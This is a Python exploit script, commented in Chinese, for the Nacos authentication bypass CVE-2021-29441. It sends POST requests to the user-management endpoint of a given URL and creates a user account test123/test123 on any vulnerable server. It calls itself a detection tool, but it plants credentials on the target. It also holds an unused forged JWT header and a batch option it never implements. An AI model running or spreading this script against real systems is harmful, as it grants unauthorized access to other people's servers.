import argparse
import requests
import threading
import random

'''
+-----------------------------------------------------------------+
漏洞名称: Nacos API认证绕过漏洞 CVE-2021-29441
影响版本: Nacos <= 2.0.0-ALPHA.1                               
单个检测：python nacos_cve_2021_29441.py -u url
批量检测：python nacos_cve_2021_29441.py -f file.txt
参考连接: https://www.cnblogs.com/xyz315/p/15853268.html
+-----------------------------------------------------------------+                                     
'''

# 伪造用户登录时的请求头和请求数据
headers = {
    "User-Agent": "Firefox/124.0",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA4"
                     "MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1tsiiQ2mzKUjnZfQJk"}

data = {
    "username": "test123",
    "password": "test123",
}


# 定义函数，用于发起POST请求并判断回显结果，每次调用这个函数发送一个请求
def send_request(url):
    mid_urls = ['', '/nacos', '/home/nocos']
    end_url = 'v1/auth/users'
    for mid_url in mid_urls:
        full_url = url + mid_url + end_url
        try:
            response = requests.post(full_url, data=data, timeout=2)
            if response.status_code == 200 and response.content.find(b"ok") != -1:
                print(f'{url} 存在API认证绕过漏洞')
                print('已创建用户test123/test123')
                return
        except requests.exceptions.RequestException as e:
            print(f'{url} 访问失败 {e}')
            return

    print('不存在API认证绕过漏洞')


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=None,
                        help='目标地址，带上http(s)://')
    args = parser.parse_args()

    if not args.url:
        print("nacos地址不能为空!")
    else:
        send_request(args.url)
